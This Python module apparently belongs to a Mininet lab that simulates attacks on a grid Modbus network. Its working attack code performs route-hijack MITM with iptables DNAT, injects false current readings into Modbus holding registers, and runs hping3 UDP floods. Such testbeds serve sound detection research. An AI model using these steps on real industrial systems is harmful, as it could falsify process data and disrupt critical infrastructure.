import os
import sys
import time
import random
from datetime import datetime

from pymodbus.client import ModbusTcpClient

DEFAULT_RTU_NAME = "h2"
DEFAULT_GATEWAY_NAME = "h3"
DEFAULT_ATTACKER_NAME = "h5"
ATTACK_ACTIVE_FLAG = "/tmp/mitm_attack_active"
RUN_ID_FILE = "/tmp/mitm_run_id"
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
MITM_LOG_DIR = os.path.join(BASE_DIR, "logs", "mitm")
MITM_TRACE_CSV = os.path.join(MITM_LOG_DIR, "mitm_trace.csv")

# Sama dengan RTU / gateway: holding register I bus, skala Modbus (h2/h3)
GATEWAY_IP = "10.0.2.2"
ATTACKER_FIELD_IP = "10.0.1.100"
MITM_PROXY_PORT = 50201
MODBUS_PORT = 5020
I_BASE_ADDR = 10
I_SCALE = 50
NUM_BUS = 5
I_INJECT_MIN_A = 1800.0
I_INJECT_MAX_A = 2600.0
MITM_FIXED_SEED = 424242

sys.path.append(BASE_DIR)
from logger.mitm_trace_logger import ensure_trace_csv, append_trace_row, now_ts, get_run_id


def _new_run_id():
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def _control_subnet_from_gateway_ip(gateway_ip: str) -> str:
    a, b, c, _ = gateway_ip.split(".")
    return f"{a}.{b}.{c}.0/24"


def _ensure_mitm_trace():
    ensure_trace_csv(MITM_TRACE_CSV)


def _write_run_id(run_id):
    with open(RUN_ID_FILE, "w", encoding="utf-8") as f:
        f.write(run_id)


def _append_trace(run_id, event, detail, phase="post_attack"):
    """Satu baris = TRACE_HEADER (11 kolom)."""
    blob = f"{phase} | {detail}" if detail else phase
    append_trace_row(
        MITM_TRACE_CSV,
        [
            now_ts(),
            event,
            run_id,
            "",
            "",
            "",
            "",
            "",
            blob[:4000],
            "",
            "",
        ],
    )


def _append_route_snapshot(run_id, stage, rtu, gateway, attacker):
    route_blob = [
        f"[{stage}] h2 ip route",
        rtu.cmd("ip route").strip(),
        f"[{stage}] h2 ip route get {gateway.IP()}",
        rtu.cmd(f"ip route get {gateway.IP()}").strip(),
        f"[{stage}] h3 ip route",
        gateway.cmd("ip route").strip(),
        f"[{stage}] h3 ip route get {rtu.IP()}",
        gateway.cmd(f"ip route get {rtu.IP()}").strip(),
        f"[{stage}] h5 ip route",
        attacker.cmd("ip route").strip(),
        f"[{stage}] h5 ip addr",
        attacker.cmd("ip addr").strip(),
    ]
    _append_trace(run_id, "routing_snapshot", " || ".join(route_blob))


def _log_modbus_inject(bus: int, i_amp: float, addr_i: int):
    append_trace_row(
        MITM_TRACE_CSV,
        [
            now_ts(),
            "modbus_tcp_inject",
            get_run_id(),
            bus,
            "",
            f"{i_amp:.6f}",
            "",
            "",
            f"holding_reg={addr_i} I_SCALE={I_SCALE}",
            "",
            "",
        ],
    )


def _iptables_dnat_modbus(attacker, attacker_name: str, gateway_ip: str, enable: bool):
    eth1 = f"{attacker_name}-eth1"
    dest = f"{ATTACKER_FIELD_IP}:{MITM_PROXY_PORT}"
    if enable:
        attacker.cmd(
            f"iptables -t nat -D PREROUTING -i {eth1} -p tcp -d {gateway_ip} "
            f"--dport {MODBUS_PORT} -j DNAT --to-destination {dest} 2>/dev/null || true"
        )
        attacker.cmd(
            f"iptables -t nat -A PREROUTING -i {eth1} -p tcp -d {gateway_ip} "
            f"--dport {MODBUS_PORT} -j DNAT --to-destination {dest}"
        )
    else:
        attacker.cmd(
            f"iptables -t nat -D PREROUTING -i {eth1} -p tcp -d {gateway_ip} "
            f"--dport {MODBUS_PORT} -j DNAT --to-destination {dest} 2>/dev/null || true"
        )


def _run_modbus_false_injection_loop():
    """
    Dijalankan di namespace Mininet (h5) sebagai: python3 h5.py modbus-inject
    (koneksi paralel; hindari jika modbus-mitm-proxy aktif).
    """
    _ensure_mitm_trace()
    host_log = os.path.join(BASE_DIR, "logs", "host", "h5.log")
    os.makedirs(os.path.dirname(host_log), exist_ok=True)
    client = ModbusTcpClient(GATEWAY_IP, port=MODBUS_PORT)
    print(
        f"[modbus-inject] Gateway {GATEWAY_IP}:{MODBUS_PORT} — false I pada holding {I_BASE_ADDR}..{I_BASE_ADDR + NUM_BUS - 1}",
        flush=True,
    )
    while True:
        try:
            if not client.connect():
                print(f"[modbus-inject] connect gagal, coba lagi...", flush=True)
                time.sleep(2)
                continue
            for bus in range(1, NUM_BUS + 1):
                i_amp = round(random.uniform(I_INJECT_MIN_A, I_INJECT_MAX_A), 3)
                addr_i = I_BASE_ADDR + (bus - 1)
                reg_val = int(i_amp * I_SCALE)
                if reg_val > 65535:
                    reg_val = 65535
                rr = client.write_register(addr_i, reg_val, unit=1)
                err = getattr(rr, "isError", None)
                if callable(err) and err():
                    print(f"[modbus-inject] bus {bus} write error: {rr}", flush=True)
                else:
                    _log_modbus_inject(bus, i_amp, addr_i)
                    print(f"[modbus-inject] bus {bus} I={i_amp} A (reg={reg_val})", flush=True)
            client.close()
        except Exception as e:
            print(f"[modbus-inject] error: {e}", flush=True)
            try:
                client.close()
            except Exception:
                pass
        time.sleep(2)


def run_mitm_attack(
    net,
    rtu_name=DEFAULT_RTU_NAME,
    gateway_name=DEFAULT_GATEWAY_NAME,
    attacker_name=DEFAULT_ATTACKER_NAME,
):
    """
    L3: h2 mengarahkan subnet kontrol via IP Field h5 + ip_forward.
    Modbus TCP ke gateway di-DNAT ke proxy lokal h5 yang mengganti nilai I (write) sebelum ke h3.
    """
    print("Running MITM (route + DNAT Modbus proxy + fixed-seed false I on path)...")
    _ensure_mitm_trace()
    run_id = _new_run_id()
    _write_run_id(run_id)
    attacker = net.get(attacker_name)
    rtu = net.get(rtu_name)
    gateway = net.get(gateway_name)
    gateway_ip = gateway.IP()
    control_subnet = _control_subnet_from_gateway_ip(gateway_ip)
    host_log = os.path.join(BASE_DIR, "logs", "host", f"{attacker_name}.log")

    _append_trace(run_id, "mitm_requested", f"DNAT->{ATTACKER_FIELD_IP}:{MITM_PROXY_PORT} gw={gateway_ip}:{MODBUS_PORT}")
    _append_route_snapshot(run_id, "before_attack", rtu, gateway, attacker)

    attacker.cmd(f"touch {ATTACK_ACTIVE_FLAG}")
    _append_trace(run_id, "flags_enabled", ATTACK_ACTIVE_FLAG)

    attacker.cmd("bash -lc 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
    attacker.cmd("sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1 || true")
    rtu.cmd(f"ip route replace {control_subnet} via {ATTACKER_FIELD_IP}")
    _append_trace(
        run_id,
        "l3_mitm_route",
        f"{rtu_name}: {control_subnet} via {ATTACKER_FIELD_IP}; fixed_seed={MITM_FIXED_SEED}",
    )

    _iptables_dnat_modbus(attacker, attacker_name, gateway_ip, enable=True)
    _append_trace(run_id, "iptables_dnat", f"{attacker_name}-eth1 d={gateway_ip}:{MODBUS_PORT} -> {ATTACKER_FIELD_IP}:{MITM_PROXY_PORT}")

    attacker.cmd(f"mkdir -p {os.path.join(BASE_DIR, 'logs', 'host')}")
    attacker.cmd(
        f"bash -lc \"echo '['$(date '+%Y-%m-%d %H:%M:%S')'] [h5] run_mitm_attack run_id='$(cat /tmp/mitm_run_id 2>/dev/null)' fixed_seed={MITM_FIXED_SEED} >> {host_log.replace(chr(92), '/')}\""
    )
    attacker.cmd(
        "if [ -f /tmp/h5_modbus_inject.pid ]; then kill $(cat /tmp/h5_modbus_inject.pid) 2>/dev/null; rm -f /tmp/h5_modbus_inject.pid; fi; "
        "if [ -f /tmp/h5_modbus_mitm_proxy.pid ]; then kill $(cat /tmp/h5_modbus_mitm_proxy.pid) 2>/dev/null; rm -f /tmp/h5_modbus_mitm_proxy.pid; fi; "
        "if [ -f /tmp/h5_http_inject.pid ]; then kill $(cat /tmp/h5_http_inject.pid) 2>/dev/null; rm -f /tmp/h5_http_inject.pid; fi"
    )

    inject_script = os.path.abspath(__file__).replace("\\", "/")
    host_log_q = host_log.replace("\\", "/")
    attacker.cmd(
        f"bash -lc 'nohup python3 -u \"{inject_script}\" modbus-mitm-proxy >>\"{host_log_q}\" 2>&1 & echo $! > /tmp/h5_modbus_mitm_proxy.pid'"
    )
    _append_trace(run_id, "mitm_proxy_started", f"fixed_seed={MITM_FIXED_SEED} script=script/mitm/mitm_modbus_proxy.py")
    time.sleep(0.5)
    _append_route_snapshot(run_id, "after_attack_enabled", rtu, gateway, attacker)

    print(
        f"MITM: {rtu_name} {control_subnet} via {ATTACKER_FIELD_IP}; "
        f"Modbus DNAT -> proxy :{MITM_PROXY_PORT} -> {gateway_ip}:{MODBUS_PORT}; fixed_seed={MITM_FIXED_SEED}"
    )


def run_dos_attack(net, mode="light"):
    h5 = net.get("h5")
    target_ip = "10.0.2.2"
    target_port = 5001

    os.makedirs("logs/host", exist_ok=True)

    h5.cmd("pkill -f hping3")

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if mode == "light":
        print("Running LIGHT DoS (Controlled UDP flood)")
        h5.cmd(f"echo '\\n===== DoS LIGHT {timestamp} =====' >> logs/host/h5.log")
        h5.cmd(
            f"hping3 --udp -p {target_port} -i u50 {target_ip} "
            f">> logs/host/h5.log 2>&1 &"
        )

    elif mode == "heavy":
        print("Running HEAVY DoS (Full UDP flood)")
        h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> logs/host/h5.log")
        h5.cmd(
            f"hping3 --udp --flood -p {target_port} {target_ip} "
            f">> logs/host/h5.log 2>&1 &"
        )


def _run_mitm_proxy_entrypoint():
    """Muat proxy yang di-generate ke script/mitm/ (bukan script/apps/)."""
    import importlib.util

    path = os.path.join(BASE_DIR, "script", "mitm", "mitm_modbus_proxy.py")
    spec = importlib.util.spec_from_file_location("mitm_modbus_proxy", path)
    mod = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(mod)
    mod.main()


if __name__ == "__main__":
    if len(sys.argv) >= 2 and sys.argv[1] == "modbus-inject":
        _run_modbus_false_injection_loop()
    elif len(sys.argv) >= 2 and sys.argv[1] == "modbus-mitm-proxy":
        _run_mitm_proxy_entrypoint()
